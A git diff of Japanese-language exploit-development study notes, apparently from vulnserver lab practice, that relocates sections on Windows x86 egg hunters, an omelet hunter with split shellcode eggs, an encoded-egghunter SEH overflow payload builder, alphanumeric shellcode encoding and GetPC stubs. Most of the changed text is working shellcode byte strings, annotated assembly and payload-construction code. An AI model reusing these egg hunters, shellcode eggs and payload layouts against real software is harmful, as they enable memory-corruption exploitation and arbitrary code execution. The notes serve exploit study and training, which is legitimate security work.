@@ -2359,6 +2359,306 @@ generic_send_tcpの時と同様、異常な入力をするとServer側のデー�
 - `tcp.port == 9999 and ip.dst == 192.168.56.5`   
 - `[Edit] [Find Packet] [String] [Packet bytes] [Narrow & Wide]`   
 bannerである`Welcome`という文字列を検索して、それが返ってこなくなった時に送信されたfuzzdataからいつの入力で落ちたのか特定できる。   
+
+### Egg-Hunter
+Egg hunter using SEH injection   
+```txt
+# Egg hunter size = 60 bytes, Egg size = 8 bytes
+EB21       jmp short 0x23
+59         pop ecx
+B890509050 mov eax,0x50905090  ; this is the tag
+51         push ecx
+6AFF       push byte -0x1
+33DB       xor ebx,ebx
+648923     mov [fs:ebx],esp
+6A02       push byte +0x2
+59         pop ecx
+8BFB       mov edi,ebx
+F3AF       repe scasd
+7507       jnz 0x20
+FFE7       jmp edi
+6681CBFF0F or bx,0xfff
+43         inc ebx
+EBED       jmp short 0x10
+E8DAFFFFFF call 0x2
+6A0C       push byte +0xc
+59         pop ecx
+8B040C     mov eax,[esp+ecx]
+B1B8       mov cl,0xb8
+83040806   add dword [eax+ecx],byte +0x6
+58         pop eax
+83C410     add esp,byte+0x10
+50         push eax
+33C0       xor eax,eax
+C3         ret
+
+egghunter = "\xeb\x21\x59\xb8"
+egghunter += "w00t"
+egghunter += "\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb"
+egghunter += "\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb"
+egghunter += "\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
+egghunter += "\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"
+```
+Egg hunter using IsBadReadPtr   
+```txt
+# Egg hunter size = 37 bytes, Egg size = 8 bytes
+33DB       xor ebx,ebx
+6681CBFF0F or bx,0xfff
+43         inc ebx
+6A08       push byte +0x8
+53         push ebx
+B80D5BE777 mov eax,0x77e75b0d
+FFD0       call eax
+85C0       test eax,eax
+75EC       jnz 0x2
+B890509050 mov eax,0x50905090 ; this is the tag
+8BFB       mov edi,ebx
+AF         scasd
+75E7       jnz 0x7
+AF         scasd
+75E4       jnz0x7
+FFE7       jmp edi
+
+egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08"
+egghunter += "\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8"
+egghunter += "w00t"
+egghunter += "\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
+```
+Egg hunter using NtDisplayString   
+```txt
+# Egg hunter size = 32 bytes, Egg size = 8 bytes
+6681CAFF0F  or dx,0x0fff
+42          inc edx
+52          push edx
+6A43        push byte +0x43   ; NtDisplayStringのsyscall番号
+58          pop eax
+CD2E        int 0x2e
+3C05        cmp al,0x5
+5A          pop edx
+74EF        jz 0x0
+B890509050  mov eax,0x50905090  ; this is the tag
+8BFA        mov edi,edx
+AF          scasd
+75EA        jnz 0x5
+AF          scasd
+75E7        jnz 0x5
+FFE7        jmp edi
+
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "w00t"
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+```
+Egg hunter using NtAccessCheck (AndAuditAlarm)   
+```txt
+前提条件：
+edxはタグを探索するアドレスを順次入れていくので、初期化されているorスタックのアドレスなどの必要がある。
+popadとかで変な値が入っている場合はxor edx,edxで初期化命令をegghunterのはじめに追加する必要がある。
+
+# Egg hunter size = 32 bytes, Egg size = 8 bytes
+6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
+                           ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
+                           ; 初めにedxが0で初期化されていない場合、xor edx,edxで初期化する必要がある場合がある
+                           ; popadをしまくった結果edxに0x41414141とかが入っていると0x41414fffから探し始めてしまうので注意！
+42          inc edx        ; acts as a counter
+                           ;(increments the value in EDX)
+52          push edx       ; pushes edx value to the  stack
+                           ;(saves our current address on the stack)
+                           ; このedxの値が、syscallによって読み込み権限があるか確認するアドレス
+                           ; 権限がない(Access-violationが発生)と、0x1000足して次のアドレスの権限を確認を繰り返す。
+6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
+                           ; or 0x43 for NtDisplayString to stack
+                           ; syscallの番号。カーネルモードでアドレスの値を参照して権限を確認する。
+                           ; 文字列へのポインタを引数にとり、読み込もうとするsyscallの関数を使う。
+58          pop eax        ; pop 0x2 or 0x43 into eax
+                           ; so it can be used as parameter
+                           ; to syscall - see next
+                           ; syscallの番号はeaxに代入しておく。
+CD2E        int 0x2e       ; tell the kernel i want a do a
+                           ; syscall using previous register
+                           ; カーネルモードでKiSystemService関数を呼びだす。
+                           ; この関数が、syscall番号に対応する関数(NtAccessCheckAndAuditAlarmなど)を呼び出す
+3C05        cmp al,0x5     ; check if access violation occurs
+                           ;(0xc0000005== ACCESS_VIOLATION) 5
+                           ; Access-Violationが発生すると、読み込み権限がないので、そもそもeggがあるかすら確認できない
+5A          pop edx        ; restore edx
+74EF        je xxxx        ; jmp back to start dx 0x0fffff
+B890509050  mov eax,0x50905090 ; this is the tag (egg)
+8BFA        mov edi,edx    ; set edi to our pointer
+AF          scasd          ; compare for status. 「ediから読み込んだ値」と「eaxの値」を比較
+                           ; edi(0x1000とか)から読み込んだ値とeax(egg)の値を比較
+                           ; 比較したあと、edi+0x4される。つまり、2つ目の4バイトのeggを指すようになる。
+75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
+                           ; eggが見つからなければjmpする
+AF          scasd          ; when egg has been found
+                           ; 比較後は、2つ目の4バイトのeggから、次の4バイト後のshellcodeを指すようになる
+75E7        jnz xxxxx      ; (jump back to "inc edx")
+                           ; if only the first egg was found
+FFE7       jmp edi         ; edi points to begin of the shellcode
+
+egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
+egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
+egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
+```
+**encoded egghunter**  
+ファイル名に使えるような文字しか使えない場合、egghunterはこのままではだめなのでEncodeしたものを使う必要がある。  
+Encodeされたenc_egghunterを実行したあとは以下のようにして、復元したegghunterを実行するようにする。   
+```txt
+enc_egghunter実行前
+|               |
+| enc_egghunter | <- eip  eipはenc_egghunterを指しているようにする 
+|      nop      |
+|      nop      | <- esp  espを基準に復元されたものがpushされるので、余裕をもった後方に設定する
+|      nop      |
+
+enc_egghunter実行後(元のegghunterを復元後)
+|               |
+| enc_egghunter | 
+|      nop      | <- eip  enc_egghunter実行後、NOPスレッドに突入する
+|   egghunter   | <- 復元されたEgghunterが現れる！このままNOPを降りていくとここを実行するようになる 
+|      nop      |
+```
+```python
+#nasm > jae $+0x23
+#00000000  7321              jnc 0x23
+
+# offset + jmp forward + poppopret + nop
+payload = "A"*294 + "\x73\x21\x41\x41" + "\x7b\x46\x7e\x6d" + "\x41"*0x30
+# popad + enc_egghunter + nop
+# enc_egghunterを実行する前にpopadでespをenc_egghunterの存在するより下の方に設定する。
+# すると、元のegghunterを再現し終わり、NOPを実行し、再現したegghunterにたどり着く
+payload = payload + "\x61"*64 + enc_egghunter + "\x41"*500
+
+# tag is "\x80\x81\x82\x83". not using 0x21-0x7f because corrupted shellcode in stack is trigared
+# "w00t"をタグに設定すると、スタック上にも"w00t"が存在することになりそっちのShellcodeが実行されることになる
+# しかし、実際に実行したいのはShellcodeが壊れていないHeapにあるShellcodeなので、あえてスタック上のタグが壊れるようにする
+payload = payload + "\x80\x81\x82\x83"*2 + buf
+```
+
+### Omlet-Hunter   
+- `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
+`calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
+omlet-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   
+
+```C
+// This is the binary code that needs to be executed to find the eggs, 
+// recombine the orignal shellcode and execute it. It is 82 bytes:
+omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDB\x31\xC0\x64\xFF\x50\x08";
+
+// These are the eggs that need to be injected into the target process 
+// for the omelet shellcode to be able to recreate the original shellcode
+// (you can insert them as many times as you want, as long as each one is
+// inserted at least once). They are 90 bytes each:
+egg0 = "\x55\xFF\x55\xDA\xBA\xB8\x7A\x1D\x40\xC4\xDB\xDF\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x31\x83\xC3\x04\x31\x43\x0F\x03\x43\x75\xFF\xB5\x38\x61\x7D\x35\xC1\x71\xE2\xBF\x24\x40\x22\xDB\x2D\xF2\x92\xAF\x60\xFE\x59\xFD\x90\x75\x2F\x2A\x96\x3E\x9A\x0C\x99\xBF\xB7\x6D\xB8\x43\xCA\xA1\x1A\x7A\x05\xB4\x5B\xBB\x78\x35\x09\x14\xF6\xE8\xBE\x11\x42\x31\x34\x69\x42\x31\xA9\x39";
+egg1 = "\x55\xFE\x55\xDA\xBA\x65\x10\x7C\x32\x3C\xB2\x7E\x97\x34\xFB\x98\xF4\x71\xB5\x13\xCE\x0E\x44\xF2\x1F\xEE\xEB\x3B\x90\x1D\xF5\x7C\x16\xFE\x80\x74\x65\x83\x92\x42\x14\x5F\x16\x51\xBE\x14\x80\xBD\x3F\xF8\x57\x35\x33\xB5\x1C\x11\x57\x48\xF0\x29\x63\xC1\xF7\xFD\xE2\x91\xD3\xD9\xAF\x42\x7D\x7B\x15\x24\x82\x9B\xF6\x99\x26\xD7\x1A\xCD\x5A\xBA\x70\x10\xE8\xC0\x36\x12";
+egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96\x8E\xE6\x9B\x7E\x5B\xBB\xC1\x80\xB1\xFF\xFF\x02\x30\x7F\x04\x1A\x31\x7A\x40\x9C\xA9\xF6\xD9\x49\xCE\xA5\xDA\x5B\xAD\x28\x49\x07\x1C\xCF\xE9\xA2\x60\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
+```
+vulnserver.exeで動作したOmlet-Hunterは以下。   
+```txt
+   0:	83 e9 78             	sub    ecx,0x78 ; ECXがEggより高いアドレスだったため、
+   3:	83 e9 78             	sub    ecx,0x78 ; ecx-562することで、Eggより低いアドレスに設定
+   6:	83 e9 78             	sub    ecx,0x78 ; こうすると、Eggの近くから検索が開始されるので早く見つけられる！
+   9:	83 e9 78             	sub    ecx,0x78
+   c:	83 e9 52             	sub    ecx,0x52 
+   f:	89 cf                	mov    edi,ecx  ; ediが0x0の場合だと、0x00000000を参照しようとしてAccess-Violationとなった
+                                            ; そのため、ECXを活用して恣意的にEggの近くから探索を始めるようにする
+  11:	bb fd ff ff ff       	mov    ebx,0xfffffffd ; eggをすべて見つけた後でもループが終わらず、権限のないアドレスを参照
+                                                  ; してAccess-Violationとなったため、3回分のEggをカウントするようにする
+                                                  ; 0xffffffff-egg_size+1 をほかで使用してないEBXに代入
+  16:	eb 29                	jmp    0x41     ; [1]にジャンプ(SEHがうんたらかんたら？？)
+  18:	51                   	push   ecx      ; [3] <- jmp先
+  19:	64 89 20             	mov    DWORD PTR fs:[eax],esp
+  1c:	fc                   	cld    
+  1d:	b0 55                	mov    al,0x55  ; 0x55回、1バイトずつEggの指す分割Shellcodeからスタックに値をコピーする
+  1f:	f2 ae                	repnz scas al,BYTE PTR es:[edi] ; ediが0x1増える？よくわかってない…
+  21:	50                   	push   eax
+  22:	89 fe                	mov    esi,edi ; この時のediのアドレスがちょうどEggを指していればEggを発見できる
+  24:	ad                   	lods   eax,DWORD PTR ds:[esi] ; Eggかもしれない値をEaxに代入
+  25:	35 ff 55 da ba       	xor    eax,0xbada55ff ; eaxの値が0xbada55ffならEgg発見！
+  2a:	83 f8 03             	cmp    eax,0x3
+  2d:	77 12                	ja     0x41   ; [1]にジャンプ(Eggは発見できない場合)
+  2f:	59                   	pop    ecx ; Eggを発見した場合、以下の処理を実行
+  30:	f7 e9                	imul   ecx
+  32:	64 03 42 08          	add    eax,DWORD PTR fs:[edx+0x8]
+  36:	97                   	xchg   edi,eax
+  37:	f3 a4                	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi] ; 0x55回、1バイトずつスタックの最後にShellcodeの一部を書き込む
+  39:	83 fb ff             	cmp    ebx,0xffffffff  ; ebx=0xfffffffdが2回incされると、合計3個分発見したことになり、Shellcodeにジャンプ
+  3c:	74 2e                	je     0x6c     ; [5]にジャンプ(shellcode用の処理にジャンプ)
+  3e:	43                   	inc    ebx ; 0xfffffffdに0x1を足す。3個分のEggをカウントする
+  3f:	89 f7                	mov    edi,esi
+  41:	31 c0                	xor    eax,eax    ; [1] <- jmp先
+  43:	64 8b 08             	mov    ecx,DWORD PTR fs:[eax]
+  46:	89 cc                	mov    esp,ecx    ; [2] <- jmp先
+  48:	59                   	pop    ecx
+  49:	81 f9 ff ff ff ff    	cmp    ecx,0xffffffff ; SEHの最後の例外ハンドラの0xffffffffかどうか確認してる？
+  4f:	75 f5                	jne    0x46      ; [2]にジャンプ
+  51:	5a                   	pop    edx
+  52:	e8 c1 ff ff ff       	call   0x18   ; [3]にジャンプ(次のアドレスでEggを探す)
+  57:	61                   	popa          ; ここら辺に到達することなくね？？と思ってる。全然わからん…
+  　　　　　　　　　　　　　　　　　　　　　　; ここから、[5]まで省いても問題なくShellcode実行まで行けたわ…
+                                          ; 多分、魔改造した結果必要なくなったっぽい？？
+  58:	8d 66 18             	lea    esp,[esi+0x18]
+  5b:	58                   	pop    eax
+  5c:	66 0d ff 0f          	or     ax,0xfff
+  60:	40                   	inc    eax
+  61:	78 03                	js     0x66   ; [4]にジャンプ
+  63:	97                   	xchg   edi,eax
+  64:	eb db                	jmp    0x41   ; [1]にジャンプ
+  66:	31 c0                	xor    eax,eax ; [4] <- jmp先
+  68:	64 ff 50 08          	call   DWORD PTR fs:[eax+0x8] ; ここらへんはよくわからん
+  6c:	c1 ef 08             	shr    edi,0x8  ; [5] <- jmp先 Ediがshellcodeを指すように調整
+  6f:	c1 e7 08             	shl    edi,0x8
+  72:	ff e7                	jmp    edi      ; ediの指すShellcodeにジャンプして実行！
+
+\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft.C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xffa\x8df\x18Xf\r\xff\x0f@x\x03\x97\xeb\xdb1\xc0d\xffP\x08\xc1\xef\x08\xc1\xe7\x08\xff\xe7
+
+以下の省略版のOmlet-HunterでもShellcode実行まで行けた！！
+相対JMPとかをうまく行くように調整したりした。
+\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9x\x83\xe9R\x89\xcf\xbb\xfd\xff\xff\xff\xeb)Qd\x89\xfc\xb0U\xf2\xaeP\x89\xfe\xad5\xffU\xda\xba\x83\xf8\x03w\x12Y\xf7\xe9d\x03B\x08\x97\xf3\xa4\x83\xfb\xfft\x19C\x89\xf71\xc0d\x8b\x08\x89\xccY\x81\xf9\xff\xff\xff\xffu\xf5Z\xe8\xc1\xff\xff\xff\xc1\xef\x08\xc1\xe7\x08\xff\xe7
+```
+SEH Omlet shellcodeは以下からダウンロードできる。   
+https://code.google.com/archive/p/w32-seh-omelet-shellcode/downloads   
+### encode shellcode
+ファイル名に使える文字しか使えないような場合、`0x21~0x7f`らへんしか使用できない。   
+
+その場合は、`mefvenom`の`x86/alpha_mixed`などでこれらの文字だけを使ってShellcodeを構成する必要がある。   
+しかし、単純に`msfvenom`を実行するだけだとDecoderの部分に使用できない文字が含まれたままになるので、`BufferRegister=ESP`などで、事前にそのShellcodeのアドレスが`ESP`などの指定したレジスタに代入されるようにする！   
+
+そのための解決策として以下があげられる。
+#### GetPC
+NULLbyteが可能なら、`call $+0x5`が有効かも。   
+```txt
+nasm > call $+0x5
+00000000  E800000000        call 0x5
+
+call命令でcall 0x5の次の命令のアドレスがスタックにpushされる。
+つまり、call命令実行後はEIPとESPが同じアドレスを示すようになる！
+```
+仮に、`0x7f`以上の文字が完全に別の文字に変換されるとして、その変換対応を把握すれば運が良ければGetPCが書けるかもしれない！   
+```txt
+!mona getpc -r eax
+  eaxに現在のスタック上のアドレスを代入する一連の処理をいくつか挙げてくれる。デコード時に便利
+  eax|  jmp short back:
+  "\xeb\x03\x58\xff\xd0\xe8\xf8\xff\xff\xff"
+  eax|  call + 4:
+  "\xe8\xff\xff\xff\xff\xc3\x58"
+  eax|  fstenv:
+  "\xd9\xeb\x9b\xd9\x74\x24\xf4\x58"
+  
+   0:	eb 03                	jmp    0x5　; [1] objdumpではjmp 0x5は左の5:の番号に相対ジャンプすることを指す
+   2:	58                   	pop    eax  ; [3] call時にスタックに保存したcall 0x2の次のアドレスをeaxに代入
+   3:	ff d0                	call   eax  ; [4] call 0x2の次の命令に復帰。EAXにはその命令のアドレスがあり目標達成
+   5:	e8 f8 ff ff ff       	call   0x2　; [2] 2:の処理(pop eax)にjmp。命令自体はcall $-0x3
+   
+   0:	e8 ff ff ff ff       	call   0x4  ; 4バイト分callして次の命令が"\xff\xc3"(inc ebx)になりNOPとして働く
+   5:	c3                   	ret         ; \xffと合体してinc ebx命令となる。inc ebxは"\x43"でも表せる？
+   6:	58                   	pop    eax  ; 4:のアドレスをeaxに代入できる
+
+   0:	d9 eb                	fldpi  
+   2:	9b d9 74 24 f4       	fstenv [esp-0xc]
+   7:	58                   	pop    eax
+
+```
+
 ## よく見るかたまり
 #### 関数の先頭
 ```txt
@@ -2890,263 +3190,6 @@ nasm > and edi,0xffffff01
 nasm > and edi,0xffffff10
 00000000  81E710FFFFFF      and edi,0xffffff10  ; これでも行けるけど、サイズがかなりでかい。美しくない
 ```
-##### Egg-Hunter
-Egg hunter using SEH injection   
-```txt
-# Egg hunter size = 60 bytes, Egg size = 8 bytes
-EB21       jmp short 0x23
-59         pop ecx
-B890509050 mov eax,0x50905090  ; this is the tag
-51         push ecx
-6AFF       push byte -0x1
-33DB       xor ebx,ebx
-648923     mov [fs:ebx],esp
-6A02       push byte +0x2
-59         pop ecx
-8BFB       mov edi,ebx
-F3AF       repe scasd
-7507       jnz 0x20
-FFE7       jmp edi
-6681CBFF0F or bx,0xfff
-43         inc ebx
-EBED       jmp short 0x10
-E8DAFFFFFF call 0x2
-6A0C       push byte +0xc
-59         pop ecx
-8B040C     mov eax,[esp+ecx]
-B1B8       mov cl,0xb8
-83040806   add dword [eax+ecx],byte +0x6
-58         pop eax
-83C410     add esp,byte+0x10
-50         push eax
-33C0       xor eax,eax
-C3         ret
-
-egghunter = "\xeb\x21\x59\xb8"
-egghunter += "w00t"
-egghunter += "\x51\x6a\xff\x33\xdb\x64\x89\x23\x6a\x02\x59\x8b\xfb"
-egghunter += "\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb"
-egghunter += "\xed\xe8\xda\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1"
-egghunter += "\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x33\xc0\xc3"
-```
-Egg hunter using IsBadReadPtr   
-```txt
-# Egg hunter size = 37 bytes, Egg size = 8 bytes
-33DB       xor ebx,ebx
-6681CBFF0F or bx,0xfff
-43         inc ebx
-6A08       push byte +0x8
-53         push ebx
-B80D5BE777 mov eax,0x77e75b0d
-FFD0       call eax
-85C0       test eax,eax
-75EC       jnz 0x2
-B890509050 mov eax,0x50905090 ; this is the tag
-8BFB       mov edi,ebx
-AF         scasd
-75E7       jnz 0x7
-AF         scasd
-75E4       jnz0x7
-FFE7       jmp edi
-
-egghunter = "\x33\xdb\x66\x81\xcb\xff\x0f\x43\x6a\x08"
-egghunter += "\x53\xb8\x0d\x5b\xe7\x77\xff\xd0\x85\xc0\x75\xec\xb8"
-egghunter += "w00t"
-egghunter += "\x8b\xfb\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"
-```
-Egg hunter using NtDisplayString   
-```txt
-# Egg hunter size = 32 bytes, Egg size = 8 bytes
-6681CAFF0F  or dx,0x0fff
-42          inc edx
-52          push edx
-6A43        push byte +0x43   ; NtDisplayStringのsyscall番号
-58          pop eax
-CD2E        int 0x2e
-3C05        cmp al,0x5
-5A          pop edx
-74EF        jz 0x0
-B890509050  mov eax,0x50905090  ; this is the tag
-8BFA        mov edi,edx
-AF          scasd
-75EA        jnz 0x5
-AF          scasd
-75E7        jnz 0x5
-FFE7        jmp edi
-
-egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
-egghunter += "w00t"
-egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
-```
-Egg hunter using NtAccessCheck (AndAuditAlarm)   
-```txt
-前提条件：
-edxはタグを探索するアドレスを順次入れていくので、初期化されているorスタックのアドレスなどの必要がある。
-popadとかで変な値が入っている場合はxor edx,edxで初期化命令をegghunterのはじめに追加する必要がある。
-
-# Egg hunter size = 32 bytes, Egg size = 8 bytes
-6681CAFF0F  or dx,0x0fff   ; はじめはedx=0x00000000に0x0fffを代入。
-                           ; 2回目のループでは0x00001000に0xfffを代入して、0x00001fffとなる。
-                           ; 初めにedxが0で初期化されていない場合、xor edx,edxで初期化する必要がある場合がある
-                           ; popadをしまくった結果edxに0x41414141とかが入っていると0x41414fffから探し始めてしまうので注意！
-42          inc edx        ; acts as a counter
-                           ;(increments the value in EDX)
-52          push edx       ; pushes edx value to the  stack
-                           ;(saves our current address on the stack)
-                           ; このedxの値が、syscallによって読み込み権限があるか確認するアドレス
-                           ; 権限がない(Access-violationが発生)と、0x1000足して次のアドレスの権限を確認を繰り返す。
-6A43        push byte +0x2 ; push 0x2 for NtAccessCheckAndAuditAlarm
-                           ; or 0x43 for NtDisplayString to stack
-                           ; syscallの番号。カーネルモードでアドレスの値を参照して権限を確認する。
-                           ; 文字列へのポインタを引数にとり、読み込もうとするsyscallの関数を使う。
-58          pop eax        ; pop 0x2 or 0x43 into eax
-                           ; so it can be used as parameter
-                           ; to syscall - see next
-                           ; syscallの番号はeaxに代入しておく。
-CD2E        int 0x2e       ; tell the kernel i want a do a
-                           ; syscall using previous register
-                           ; カーネルモードでKiSystemService関数を呼びだす。
-                           ; この関数が、syscall番号に対応する関数(NtAccessCheckAndAuditAlarmなど)を呼び出す
-3C05        cmp al,0x5     ; check if access violation occurs
-                           ;(0xc0000005== ACCESS_VIOLATION) 5
-                           ; Access-Violationが発生すると、読み込み権限がないので、そもそもeggがあるかすら確認できない
-5A          pop edx        ; restore edx
-74EF        je xxxx        ; jmp back to start dx 0x0fffff
-B890509050  mov eax,0x50905090 ; this is the tag (egg)
-8BFA        mov edi,edx    ; set edi to our pointer
-AF          scasd          ; compare for status. 「ediから読み込んだ値」と「eaxの値」を比較
-                           ; edi(0x1000とか)から読み込んだ値とeax(egg)の値を比較
-                           ; 比較したあと、edi+0x4される。つまり、2つ目の4バイトのeggを指すようになる。
-75EA        jnz xxxxxx     ; (back to inc edx) check egg found or not
-                           ; eggが見つからなければjmpする
-AF          scasd          ; when egg has been found
-                           ; 比較後は、2つ目の4バイトのeggから、次の4バイト後のshellcodeを指すようになる
-75E7        jnz xxxxx      ; (jump back to "inc edx")
-                           ; if only the first egg was found
-FFE7       jmp edi         ; edi points to begin of the shellcode
-
-egghunter = "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
-egghunter += "\x77\x30\x30\x74" # this is the marker/tag: w00t
-egghunter += "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
-```
-**encoded egghunter**  
-ファイル名に使えるような文字しか使えない場合、egghunterはこのままではだめなのでEncodeしたものを使う必要がある。  
-Encodeされたenc_egghunterを実行したあとは以下のようにして、復元したegghunterを実行するようにする。   
-```txt
-enc_egghunter実行前
-|               |
-| enc_egghunter | <- eip  eipはenc_egghunterを指しているようにする 
-|      nop      |
-|      nop      | <- esp  espを基準に復元されたものがpushされるので、余裕をもった後方に設定する
-|      nop      |
-
-enc_egghunter実行後(元のegghunterを復元後)
-|               |
-| enc_egghunter | 
-|      nop      | <- eip  enc_egghunter実行後、NOPスレッドに突入する
-|   egghunter   | <- 復元されたEgghunterが現れる！このままNOPを降りていくとここを実行するようになる 
-|      nop      |
-```
-```python
-#nasm > jae $+0x23
-#00000000  7321              jnc 0x23
-
-# offset + jmp forward + poppopret + nop
-payload = "A"*294 + "\x73\x21\x41\x41" + "\x7b\x46\x7e\x6d" + "\x41"*0x30
-# popad + enc_egghunter + nop
-# enc_egghunterを実行する前にpopadでespをenc_egghunterの存在するより下の方に設定する。
-# すると、元のegghunterを再現し終わり、NOPを実行し、再現したegghunterにたどり着く
-payload = payload + "\x61"*64 + enc_egghunter + "\x41"*500
-
-# tag is "\x80\x81\x82\x83". not using 0x21-0x7f because corrupted shellcode in stack is trigared
-# "w00t"をタグに設定すると、スタック上にも"w00t"が存在することになりそっちのShellcodeが実行されることになる
-# しかし、実際に実行したいのはShellcodeが壊れていないHeapにあるShellcodeなので、あえてスタック上のタグが壊れるようにする
-payload = payload + "\x80\x81\x82\x83"*2 + buf
-```
-
-##### Omlet-Hunter   
-- `w32_SEH_omelet.py w32_SEH_omelet.bin calc.bin calceggs.txt 127 0xBADA55`   
-`calc.bin`のシェルコードを分割して、calceggs.txtに用意する。127サイズ以下に分割して、マーカーは`0xbada55`に設定。   
-omlet-hunterはタグを頼りに、全ての分割されたeggを見つけて、元のshellcodeをスタックの最後の方に復元して、実行する。   
-
-```C
-// This is the binary code that needs to be executed to find the eggs, 
-// recombine the orignal shellcode and execute it. It is 82 bytes:
-omelet_code = "\x31\xFF\xEB\x23\x51\x64\x89\x20\xFC\xB0\x55\xF2\xAE\x50\x89\xFE\xAD\x35\xFF\x55\xDA\xBA\x83\xF8\x03\x77\x0C\x59\xF7\xE9\x64\x03\x42\x08\x97\xF3\xA4\x89\xF7\x31\xC0\x64\x8B\x08\x89\xCC\x59\x81\xF9\xFF\xFF\xFF\xFF\x75\xF5\x5A\xE8\xC7\xFF\xFF\xFF\x61\x8D\x66\x18\x58\x66\x0D\xFF\x0F\x40\x78\x03\x97\xEB\xDB\x31\xC0\x64\xFF\x50\x08";
-
-// These are the eggs that need to be injected into the target process 
-// for the omelet shellcode to be able to recreate the original shellcode
-// (you can insert them as many times as you want, as long as each one is
-// inserted at least once). They are 90 bytes each:
-egg0 = "\x55\xFF\x55\xDA\xBA\xB8\x7A\x1D\x40\xC4\xDB\xDF\xD9\x74\x24\xF4\x5B\x31\xC9\xB1\x31\x83\xC3\x04\x31\x43\x0F\x03\x43\x75\xFF\xB5\x38\x61\x7D\x35\xC1\x71\xE2\xBF\x24\x40\x22\xDB\x2D\xF2\x92\xAF\x60\xFE\x59\xFD\x90\x75\x2F\x2A\x96\x3E\x9A\x0C\x99\xBF\xB7\x6D\xB8\x43\xCA\xA1\x1A\x7A\x05\xB4\x5B\xBB\x78\x35\x09\x14\xF6\xE8\xBE\x11\x42\x31\x34\x69\x42\x31\xA9\x39";
-egg1 = "\x55\xFE\x55\xDA\xBA\x65\x10\x7C\x32\x3C\xB2\x7E\x97\x34\xFB\x98\xF4\x71\xB5\x13\xCE\x0E\x44\xF2\x1F\xEE\xEB\x3B\x90\x1D\xF5\x7C\x16\xFE\x80\x74\x65\x83\x92\x42\x14\x5F\x16\x51\xBE\x14\x80\xBD\x3F\xF8\x57\x35\x33\xB5\x1C\x11\x57\x48\xF0\x29\x63\xC1\xF7\xFD\xE2\x91\xD3\xD9\xAF\x42\x7D\x7B\x15\x24\x82\x9B\xF6\x99\x26\xD7\x1A\xCD\x5A\xBA\x70\x10\xE8\xC0\x36\x12";
-egg2 = "\x55\xFD\x55\xDA\xBA\xF2\xCA\x66\x7B\xC3\x41\xE9\xFC\xDC\x83\x4E\xF2\x96\x8E\xE6\x9B\x7E\x5B\xBB\xC1\x80\xB1\xFF\xFF\x02\x30\x7F\x04\x1A\x31\x7A\x40\x9C\xA9\xF6\xD9\x49\xCE\xA5\xDA\x5B\xAD\x28\x49\x07\x1C\xCF\xE9\xA2\x60\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40\x40";
-```
